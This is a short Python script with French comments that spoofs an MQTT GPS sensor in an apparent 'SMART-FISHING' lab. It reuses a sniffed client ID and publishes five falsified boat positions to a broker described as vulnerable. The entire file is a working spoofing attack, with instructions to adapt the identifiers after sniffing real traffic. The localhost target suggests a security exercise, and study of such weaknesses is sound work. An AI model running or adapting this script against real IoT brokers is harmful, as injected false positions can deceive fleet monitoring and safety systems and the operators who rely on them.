#!/usr/bin/env python3
"""
Script de Spoofing MQTT — SMART-FISHING
Usurpe l'identité d'un capteur GPS légitime et publie une fausse position
"""

import paho.mqtt.client as mqtt
import json
import time
import random

# Configuration du broker vulnérable
BROKER = "localhost"
PORT = 1883

# Identifiants du capteur légitime (à adapter après sniffing)
CLIENT_ID = "capteur_GPS_001"
TOPIC = "fishing/boat/BT-Abi-01/gps"

def on_connect(client, userdata, flags, rc):
    """Callback lors de la connexion au broker"""
    if rc == 0:
        print(f"[+] Connecté au broker avec Client ID: {CLIENT_ID} ✅")
        print("[*] Spoofing en cours...")
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_disconnect(client, userdata, rc):
    print("[+] Déconnecté du broker")

def on_publish(client, userdata, mid):
    print(f"[+] Message {mid} publié ✅")

# Créer le client avec le Client ID usurpé
client = mqtt.Client(client_id=CLIENT_ID)
client.on_connect = on_connect
client.on_disconnect = on_disconnect
client.on_publish = on_publish

# Se connecter
print("[*] Tentative de spoofing...")
client.connect(BROKER, PORT, 60)
client.loop_start()
time.sleep(1)

# Publier 5 messages GPS falsifiés
print("\n[*] Publication de 5 positions GPS falsifiées...")
for i in range(5):
    payload = {
        "capteur_id": "GPS-001",
        "lat": round(random.uniform(4.0, 4.5), 5),   # Position falsifiée, loin de la zone réelle
        "lng": round(random.uniform(-8.0, -7.5), 5), # ex: au large, hors zone de pêche habituelle
        "vitesse": round(random.uniform(0.0, 2.0), 1),  # Vitesse quasi nulle suspecte (ex: bateau à la dérive)
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "alerte": "POSITION_ANORMALE",
        "source": "spoofing"
    }
    client.publish(TOPIC, json.dumps(payload))
    print(f"[{i+1}/5] Publié: lat={payload['lat']}, lng={payload['lng']} (position falsifiée)")
    time.sleep(2)

client.loop_stop()
client.disconnect()
print("\n[+] Attaque de spoofing terminée ✅")
